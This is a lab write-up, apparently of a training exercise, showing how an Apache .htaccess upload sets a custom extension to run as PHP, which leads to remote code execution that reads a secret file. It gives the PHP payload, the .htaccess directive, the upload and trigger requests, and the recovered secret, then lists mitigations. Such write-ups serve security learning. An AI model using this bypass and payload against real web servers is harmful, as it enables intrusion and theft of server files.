````markdown
# 🛡️ File Upload Exploitation – Apache .htaccess Bypass

This project documents a successful file upload exploitation against a simulated vulnerable web application.  
The lab demonstrates how weak file upload validation can be bypassed to achieve **remote code execution (RCE)** using an `.htaccess` trick on an Apache server.

---

## 📑 Table of Contents
1. [Lab Overview](#lab-overview)  
2. [Exploitation Walkthrough](#exploitation-walkthrough)  
   - [Normal File Upload](#normal-file-upload)  
   - [Crafting Malicious Payload](#crafting-malicious-payload)  
   - [Identifying Server](#identifying-server)  
   - [Uploading .htaccess](#uploading-htaccess)  
   - [Uploading Exploit with New Extension](#uploading-exploit-with-new-extension)  
   - [Triggering RCE](#triggering-rce)  
3. [Security Impact](#security-impact)  
4. [Recommended Mitigations](#recommended-mitigations)  
5. [Proof of Exploit](#proof-of-exploit)  
6. [Secret Obtained](#secret-obtained)  
7. [Takeaways](#takeaways)  

---

## Lab Overview
- **Target:** Web application with avatar upload functionality  
- **Vulnerability:** File upload restrictions + Apache `.htaccess` misconfiguration  
- **Impact:** Remote Code Execution → Secret file disclosure  

---

## Exploitation Walkthrough

### Normal File Upload
- Logged in and uploaded an image as the avatar.  
- Observed the image was fetched with:

```http
GET /files/avatars/<YOUR-IMAGE>
````

### Crafting Malicious Payload

Created a PHP file `exploit.php` to read Carlos’s secret:

```php
<?php
echo file_get_contents('/home/carlos/secret');
?>
```

* Attempt to upload failed → `.php` extension not allowed.

### Identifying Server

The response from `POST /my-account/avatar` revealed:

```http
Server: Apache/2.4.41 (Ubuntu)
```

* Apache + mod\_php hinted at an `.htaccess` bypass.

### Uploading .htaccess

Modified the upload request in Burp Repeater:

```text
- Changed filename → .htaccess
- Content-Type → text/plain
- File contents:
AddType application/x-httpd-php .l33t
```

* Uploaded successfully ✅

### Uploading Exploit with New Extension

Reused the upload request:

```text
- Changed filename → exploit.l33t
- File contents → PHP payload
```

* Uploaded successfully ✅

### Triggering RCE

Requested:

```http
GET /files/avatars/exploit.l33t
```

* Server executed PHP → Secret was disclosed:

```
FxPam6dKbign7PBPqaNxPRZ76HsNCXr3
```

---

## Security Impact

* **Severity:** 🔴 High
* **Risk:** Arbitrary PHP execution on the server
* **Impact:** Unauthorized file disclosure, possible full system compromise

---

## Recommended Mitigations

* Disable `.htaccess` overrides:

```apache
AllowOverride None
```

* Store uploads outside web root
* Strict MIME-type & extension validation (both client + server)
* Sanitize uploaded content before saving

---

## Proof of Exploit

<img width="957" height="1079" alt="Proof of exploit in Burp Repeater" src="https://github.com/user-attachments/assets/f15c03db-3747-4761-9709-d0349b92cd41" />

---

## Secret Obtained

```
FxPam6dKbign7PBPqaNxPRZ76HsNCXr3
```

---

## Takeaways

This lab highlights how **misconfigured servers + weak upload validation** can escalate into RCE.
Preventing such attacks requires **defense-in-depth**: secure configs, strict validation, and isolating user uploads.

```

---
